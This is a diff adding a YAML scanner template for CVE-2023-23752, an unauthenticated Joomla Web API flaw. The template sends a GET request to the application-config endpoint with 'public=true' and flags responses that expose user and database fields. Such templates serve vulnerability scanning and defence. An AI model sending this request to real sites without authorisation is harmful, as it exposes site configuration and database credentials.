@@ -1,0 +1,27 @@
+id: poc-yaml-joomla-web-api-unauthorized-access
+info:
+  name: Joomla Web Api 接口未授权访问漏洞
+  severity: medium
+  tags:
+  - CVE-2023-23752
+  - 两高一弱
+  finger: joomla
+variables:
+  path: '/api/index.php/v1/config/application?public=true
+
+    /api/v1/config/application?public=true'
+requests:
+- method: GET
+  path: '{{.path}}'
+  expression: 'status_code == 200
+
+    && contains(body, "links")
+
+    && contains(body, "\"attributes\":")
+
+    && contains(body, "user")
+
+    && contains(body, "\"dbsslcert\"")
+
+    '
+transport: http
